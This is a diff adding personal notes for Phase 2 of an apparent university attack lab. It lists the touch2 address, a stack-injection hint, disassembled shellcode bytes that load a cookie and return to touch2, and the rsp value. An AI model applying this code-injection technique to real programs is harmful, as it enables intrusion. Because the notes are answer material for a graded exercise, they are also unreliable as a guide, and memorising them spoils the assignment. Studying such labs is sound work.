@@ -25,3 +25,26 @@ But this will work
 
   ./hex2raw < l1.hex > l1.raw
   ./ctarget -q -i l1.raw
+
+
+Phase 2
+=======
+
+Where is touch2?
+
+00000000004017ec <touch2>:
+
+Hint: place injected code on stack then set the
+return addr to the start of the injected code.
+
+Code to be injected: 
+
+0000000000000000 <.text>:
+0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+7:   68 ec 17 40 00          push   $0x4017ec
+c:   c3                      ret
+
+Where is rsp?
+
+rsp            0x5561dc78          0x5561dc78
+
